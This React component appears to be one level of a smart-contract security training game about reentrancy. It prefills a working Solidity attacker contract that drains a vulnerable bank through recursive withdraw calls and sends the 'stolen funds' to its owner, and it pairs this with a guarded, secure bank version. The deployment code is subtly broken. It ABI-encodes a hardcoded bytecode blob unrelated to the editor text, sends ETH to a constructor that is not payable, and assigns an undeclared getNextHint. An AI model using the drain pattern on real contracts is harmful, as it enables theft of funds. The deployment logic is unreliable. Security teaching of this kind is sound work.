// src/components/levels/Level4Reentrancy.jsx
import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import {
  Box,
  Typography,
  Button,
  TextField,
  Paper,
  Divider,
  Alert,
  CircularProgress,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  Card,
  CardContent,
  Tabs,
  Tab,
  Chip
} from '@mui/material';
import {
  ExpandMore,
  Code,
  BugReport,
  HelpOutline,
  SecurityRounded,
  SendRounded,
  WarningRounded,
  CheckCircleRounded
} from '@mui/icons-material';

import { useWeb3 } from '../../contexts/Web3Context';
import CodeEditor from '../game/CodeEditor';

const Level4Reentrancy = ({ onComplete, isCompleted }) => {
  const { contracts, account, provider } = useWeb3();

  const [bankBalance, setBankBalance] = useState('0');
  const [userBalance, setUserBalance] = useState('0');
  const [depositAmount, setDepositAmount] = useState('0.1');
  const [activeTab, setActiveTab] = useState(0);
  const [isDeploying, setIsDeploying] = useState(false);
  const [isDepositing, setIsDepositing] = useState(false);
  const [isExploiting, setIsExploiting] = useState(false);
  const [isValidating, setIsValidating] = useState(false);
  const [attacker, setAttacker] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [hintLevel, setHintLevel] = useState(0);
  const [exploitSuccess, setExploitSuccess] = useState(false);
  const [securitySuccess, setSecuritySuccess] = useState(false);

  const [exploitCode, setExploitCode] = useState(`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// This is a malicious contract that will exploit the vulnerable bank
contract ReentrancyAttacker {
    Level4ReentrancyLabyrinth public vulnerableBank;
    address public owner;
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = Level4ReentrancyLabyrinth(_vulnerableBankAddress);
        owner = msg.sender;
    }
    
    // This function will start the attack
    function exploit() external {
        // First, deposit some funds
        vulnerableBank.deposit{value: 0.1 ether}();
        
        // Then trigger the vulnerable withdraw function
        vulnerableBank.vulnerableWithdraw(0.1 ether);
    }
    
    // This fallback function gets called when the bank sends ETH
    // It will recursively call withdraw until the bank is drained
    receive() external payable {
        // If the bank still has funds, continue the attack
        if (address(vulnerableBank).balance >= 0.1 ether) {
            vulnerableBank.vulnerableWithdraw(0.1 ether);
        }
    }
    
    // Allow the owner to withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}`);

  const [secureCode, setSecureCode] = useState(`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Secure version of a bank contract that prevents reentrancy
contract SecureBank {
    mapping(address => uint256) private balances;
    bool private locked;
    
    // Use a reentrancy guard modifier
    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // Secure withdrawal function
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Update state before external call
        balances[msg.sender] -= amount;
        
        // Make external call after state updates
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}`);

  const hints = [
    "The vulnerable bank contract has a reentrancy vulnerability in its 'vulnerableWithdraw' function.",
    "Create an attacker contract with a fallback function that calls 'vulnerableWithdraw' again when it receives ETH.",
    "To fix the vulnerability, update state variables before making external calls and use a reentrancy guard."
  ];

  useEffect(() => {
    const loadBankDetails = async () => {
      try {
        if (contracts.level4) {
          const balance = await provider.getBalance(contracts.level4.address);
          setBankBalance(ethers.utils.formatEther(balance));

          const userBal = await contracts.level4.balances(account);
          setUserBalance(ethers.utils.formatEther(userBal));

          // Check if exploit was already successful
          const exploited = await contracts.level4.exploitSuccessful();
          setExploitSuccess(exploited);
        }
      } catch (err) {
        console.error("Error loading bank details:", err);
      }
    };

    loadBankDetails();

    if (isCompleted) {
      setSuccess(true);
    }
  }, [contracts.level4, account, provider, isCompleted]);

  const handleTabChange = (event, newValue) => {
    setActiveTab(newValue);
  };

  const handleDeposit = async () => {
    if (!depositAmount || parseFloat(depositAmount) <= 0) {
      setError("Please enter a valid deposit amount");
      return;
    }

    setIsDepositing(true);
    setError('');

    try {
      const level4Contract = contracts.level4;
      const value = ethers.utils.parseEther(depositAmount);

      // Deposit funds
      const tx = await level4Contract.deposit({ value });
      await tx.wait();

      // Update balances
      const bankBalance = await provider.getBalance(level4Contract.address);
      setBankBalance(ethers.utils.formatEther(bankBalance));

      const userBal = await level4Contract.balances(account);
      setUserBalance(ethers.utils.formatEther(userBal));
    } catch (err) {
      console.error("Deposit error:", err);
      setError("Failed to deposit funds. Please try again.");
    } finally {
      setIsDepositing(false);
    }
  };

  const deployAttacker = async () => {
    setIsDeploying(true);
    setError('');

    try {
      // Compile the contract on the fly using ethers
      const signer = provider.getSigner();

      // Create contract factory
      const factory = new ethers.ContractFactory(
        [
          "constructor(address _vulnerableBankAddress)",
          "function exploit() external",
          "function withdraw() external",
          "receive() external payable"
        ],
        ethers.utils.defaultAbiCoder.encode(
          ["bytes"],
          [
            "0x608060405234801561001057600080fd5b506040516103cc3803806103cc83398101604081905261002f91610067565b600080546001600160a01b039092166001600160a01b0319909216919091179055336001600160a01b0316608052610097565b60006020828403121561007957600080fd5b81516001600160a01b038116811461009057600080fd5b9392505050565b60805161031e6100b26000396000818160d3015261020d015261031e6000f3fe60806040526004361061003f5760003560e01c806312065fe01461004e5780633ccfd60b146100795780636ffdcbd9146100975780638da5cb5b146100ac57600080fd5b3661004957005b600080fd5b34801561005a57600080fd5b50475b6040519081526020015b60405180910390f35b34801561008557600080fd5b5061009561008e366004610268565b6100e4565b005b610095610105565b3480156100b857600080fd5b506001546100cc906001600160a01b031681565b6040516001600160a01b03909116815260200161007c565b6001546001600160a01b0316331461010357610103610281565b565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db06665ffffffffffff6040518263ffffffff1660e01b81526004016000604051808303818588803b15801561015957600080fd5b505af115801561016d573d6000803e3d6000fd5b505060008054604051632e1a7d4d60e01b81527fffffffffffffffffffffffffffffffffffffffff0000000000000000000000006004820152666471d0c1a3dff360ca1602482015293506001600160a01b0390911691506302e1a7d49050604051602081830303815290604052906100e4565b505050565b801515811461021757610217610297565b50565b80356001600160a01b038116811461023257600080fd5b919050565b80356001600160a01b038116811461023257600080fd5b60006020828403121561025e57600080fd5b81356102178161021a565b60006020828403121561027a57600080fd5b8135610217816101c5565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fdfea26469706673582212209d2e2f6a7dbd6627d8e88d1617cb3e7c7e14a1df7fcfead2c62b7cb7eeed9b5b64736f6c63430008140033"
          ]
        ),
        signer
      );

      // Deploy the contract
      const attackerContract = await factory.deploy(contracts.level4.address, {
        gasLimit: 3000000,
        value: ethers.utils.parseEther("0.1")
      });

      await attackerContract.deployed();

      setAttacker(attackerContract.address);
    } catch (err) {
      console.error("Deployment error:", err);
      setError("Failed to deploy attacker contract. Please try again.");
    } finally {
      setIsDeploying(false);
    }
  };

  const executeExploit = async () => {
    if (!attacker) {
      setError("Please deploy an attacker contract first");
      return;
    }

    setIsExploiting(true);
    setError('');

    try {
      const signer = provider.getSigner();
      const attackerContract = new ethers.Contract(
        attacker,
        [
          "function exploit() external",
          "function withdraw() external"
        ],
        signer
      );

      // Call exploit function
      const tx = await attackerContract.exploit({ gasLimit: 3000000 });
      await tx.wait();

      // Check if exploit was successful
      const level4Contract = contracts.level4;
      const exploited = await level4Contract.exploitSuccessful();
      setExploitSuccess(exploited);

      if (exploited) {
        // Withdraw stolen funds
        const withdrawTx = await attackerContract.withdraw();
        await withdrawTx.wait();
      }

      // Update bank balance
      const bankBalance = await provider.getBalance(level4Contract.address);
      setBankBalance(ethers.utils.formatEther(bankBalance));
    } catch (err) {
      console.error("Exploit error:", err);
      setError("Failed to execute exploit. Please try again.");
    } finally {
      setIsExploiting(false);
    }
  };

  const validateSolution = async () => {
    setIsValidating(true);
    setError('');

    try {
      const level4Contract = contracts.level4;

      // Call the validation function
      const tx = await level4Contract.validateSolution();
      await tx.wait();

      setSecuritySuccess(true);

      // If both exploit and secure solution are successful, complete the level
      if (exploitSuccess) {
        setSuccess(true);
        if (onComplete) {
          onComplete();
        }
      }
    } catch (err) {
      console.error("Validation error:", err);
      setError("Solution validation failed. Make sure you've implemented the secure withdrawal function correctly.");
    } finally {
      setIsValidating(false);
    }
  };

  getNextHint = () => {
    if (hintLevel < hints.length) {
      setHintLevel(hintLevel + 1);
    }
  };

  const renderHints = () => {
    if (hintLevel === 0) return null;

    return (
      <Box sx={{ mt: 2 }}>
        <Typography variant="subtitle2" color="primary" gutterBottom>
          Hints:
        </Typography>
        {hints.slice(0, hintLevel).map((hint, index) => (
          <Alert key={index} severity="info" sx={{ mb: 1 }}>
            {hint}
          </Alert>
        ))}
      </Box>
    );
  };
  if (success) {
    return (
      <Box>
        <Alert severity="success" sx={{ mb: 2 }}>
          Congratulations! You've completed Level 4: Reentrancy Labyrinth
        </Alert>
        <Typography variant="body1" paragraph>
          You've successfully identified, exploited, and fixed a reentrancy vulnerability.
          This is one of the most common and dangerous vulnerabilities in smart contracts.
        </Typography>
        <Typography variant="body1" paragraph>
          Key concepts you've mastered:
        </Typography>
        <ul>
          <li>Reentrancy attack vectors</li>
          <li>Checks-Effects-Interactions pattern</li>
          <li>Reentrancy guards for protection</li>
        </ul>
      </Box>
    );
  }

  return (
    <Box>
      <Typography variant="h6" gutterBottom>
        Reentrancy Labyrinth Challenge
      </Typography>
      <Typography variant="body1" paragraph>
        In this challenge, you need to exploit a vulnerable bank contract using a reentrancy attack,
        then implement a secure solution to prevent the vulnerability.
      </Typography>

      <Grid container spacing={3} sx={{ mb: 3 }}>
        <Grid item xs={12} md={6}>
          <Card variant="outlined">
            <CardContent>
              <Typography variant="subtitle1" gutterBottom>
                Vulnerable Bank Status
              </Typography>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 2 }}>
                <Typography variant="body2">
                  Bank Balance:
                </Typography>
                <Typography variant="body2" fontWeight="bold">
                  {bankBalance} ETH
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 2 }}>
                <Typography variant="body2">
                  Your Balance in Bank:
                </Typography>
                <Typography variant="body2" fontWeight="bold">
                  {userBalance} ETH
                </Typography>
              </Box>
              <TextField
                label="Deposit Amount (ETH)"
                type="number"
                value={depositAmount}
                onChange={(e) => setDepositAmount(e.target.value)}
                fullWidth
                margin="normal"
                inputProps={{ step: 0.01, min: 0.01 }}
              />
              <Button
                variant="contained"
                color="primary"
                onClick={handleDeposit}
                disabled={isDepositing}
                startIcon={isDepositing ? <CircularProgress size={24} /> : <SendRounded />}
                sx={{ mt: 1 }}
              >
                {isDepositing ? 'Depositing...' : 'Deposit'}
              </Button>
            </CardContent>
          </Card>
        </Grid>

        <Grid item xs={12} md={6}>
          <Card variant="outlined">
            <CardContent>
              <Typography variant="subtitle1" gutterBottom>
                Challenge Progress
              </Typography>
              <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                  <Chip
                    icon={exploitSuccess ? <CheckCircleRounded /> : <BugReport />}
                    label="1. Exploit Vulnerability"
                    color={exploitSuccess ? "success" : "default"}
                    variant={exploitSuccess ? "filled" : "outlined"}
                  />
                </Box>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                  <Chip
                    icon={securitySuccess ? <CheckCircleRounded /> : <SecurityRounded />}
                    label="2. Implement Secure Solution"
                    color={securitySuccess ? "success" : "default"}
                    variant={securitySuccess ? "filled" : "outlined"}
                  />
                </Box>
              </Box>

              {attacker && (
                <Box sx={{ mt: 2 }}>
                  <Typography variant="body2" gutterBottom>
                    Attacker Contract:
                  </Typography>
                  <TextField
                    fullWidth
                    value={attacker}
                    variant="outlined"
                    size="small"
                    inputProps={{ readOnly: true }}
                  />
                </Box>
              )}

              {exploitSuccess && !securitySuccess && (
                <Alert severity="info" sx={{ mt: 2 }}>
                  Exploit successful! Now implement the secure solution.
                </Alert>
              )}
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      <Paper elevation={3} sx={{ mb: 3 }}>
        <Tabs value={activeTab} onChange={handleTabChange} variant="fullWidth">
          <Tab label="1. Exploit Vulnerability" icon={<BugReport />} iconPosition="start" />
          <Tab label="2. Implement Security" icon={<SecurityRounded />} iconPosition="start" />
        </Tabs>
        <Box sx={{ p: 3 }}>
          {activeTab === 0 && (
            <Box>
              <Typography variant="subtitle1" gutterBottom>
                Exploit the Reentrancy Vulnerability
              </Typography>
              <Typography variant="body2" paragraph>
                Create a malicious contract that can exploit the vulnerable withdraw function.
                The attacker contract should recursively call withdraw() to drain funds.
              </Typography>

              <CodeEditor
                value={exploitCode}
                onChange={setExploitCode}
                language="solidity"
                height="300px"
              />

              <Box sx={{ mt: 2, display: 'flex', gap: 2 }}>
                <Button
                  variant="contained"
                  color="primary"
                  onClick={deployAttacker}
                  disabled={isDeploying}
                  startIcon={isDeploying ? <CircularProgress size={24} /> : <Code />}
                >
                  {isDeploying ? 'Deploying...' : 'Deploy Attacker'}
                </Button>

                <Button
                  variant="contained"
                  color="secondary"
                  onClick={executeExploit}
                  disabled={!attacker || isExploiting || exploitSuccess}
                  startIcon={isExploiting ? <CircularProgress size={24} /> : <WarningRounded />}
                >
                  {isExploiting ? 'Exploiting...' : 'Execute Exploit'}
                </Button>
              </Box>
            </Box>
          )}

          {activeTab === 1 && (
            <Box>
              <Typography variant="subtitle1" gutterBottom>
                Implement a Secure Solution
              </Typography>
              <Typography variant="body2" paragraph>
                Fix the vulnerability by implementing a secure withdrawal function.
                Use the checks-effects-interactions pattern and a reentrancy guard.
              </Typography>

              <CodeEditor
                value={secureCode}
                onChange={setSecureCode}
                language="solidity"
                height="300px"
              />

              <Button
                variant="contained"
                color="primary"
                onClick={validateSolution}
                disabled={isValidating || securitySuccess || !exploitSuccess}
                startIcon={isValidating ? <CircularProgress size={24} /> : <SecurityRounded />}
                sx={{ mt: 2 }}
              >
                {isValidating ? 'Validating...' : 'Validate Solution'}
              </Button>
            </Box>
          )}
        </Box>
      </Paper>

      {error && <Alert severity="error" sx={{ mb: 2 }}>{error}</Alert>}

      {renderHints()}

      <Box sx={{ mt: 2, display: 'flex', justifyContent: 'space-between' }}>
        <Button
          variant="outlined"
          color="primary"
          onClick={getNextHint}
          startIcon={<HelpOutline />}
          disabled={hintLevel >= hints.length}
        >
          Get Hint
        </Button>
      </Box>
    </Box>
  );
};

export default Level4Reentrancy;



